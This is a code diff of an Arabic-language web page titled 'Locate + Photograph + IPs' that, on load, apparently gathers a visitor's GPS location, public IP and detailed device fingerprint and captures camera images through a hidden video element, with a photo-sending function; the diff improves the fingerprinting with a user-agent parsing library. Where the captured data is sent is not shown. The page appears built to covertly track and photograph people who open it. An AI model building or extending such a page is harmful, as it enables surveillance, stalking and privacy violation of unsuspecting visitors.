@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>📍 تحديد + تصوير + IPs</title>
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1/dist/ua-parser.min.js"></script>
 </head>
 <body>
   <video id="video" autoplay playsinline style="display:none;"></video>
@@ -25,25 +26,21 @@
     let deviceInfo = "";
 
     function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      const platform = navigator.platform;
-      const memory = navigator.deviceMemory || "❓";
+      const parser = new UAParser();
+      const res = parser.getResult();
+      const device = res.device;
+      const os = res.os;
+      const browser = res.browser;
       const cores = navigator.hardwareConcurrency || "❓";
+      const mem = navigator.deviceMemory || "❓";
       const screenRes = `${screen.width}x${screen.height}`;
-      const browser = (() => {
-        if (ua.includes("Chrome")) return "Chrome";
-        if (ua.includes("Firefox")) return "Firefox";
-        if (ua.includes("Safari")) return "Safari";
-        if (ua.includes("Edge")) return "Edge";
-        return "غير معروف";
-      })();
-
       deviceInfo = `🧠 معلومات الجهاز:
-📱 المنصة: ${platform}
-🌐 المتصفح: ${browser}
+📱 الجهاز: ${device.vendor || ""} ${device.model || ""} (${device.type || "غير معروف"})
+🧩 النظام: ${os.name || ""} ${os.version || ""}
+🌐 المتصفح: ${browser.name || ""} ${browser.version || ""}
 📟 الشاشة: ${screenRes}
-💾 الرام التقريبي: ${memory} GB
-🧮 عدد الأنوية: ${cores}`;
+💾 الرام: ${mem} GB
+🧮 أنوية المعالج: ${cores}`;
     }
 
     function sendPhoto(blob) {
@@ -169,6 +166,7 @@ Longitude: ${gpsLon}
     }
 
     function initCamera() {
+      document.getElementById("result").innerText += "\n📸 يتم الآن التقاط صورة...";
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           const video = document.getElementById("video");
@@ -188,7 +186,7 @@ Longitude: ${gpsLon}
         });
     }
 
-    // بدء العمليات
+    // تشغيل كل شيء
     getDeviceInfo();
     getLocation();
     getPublicIP();
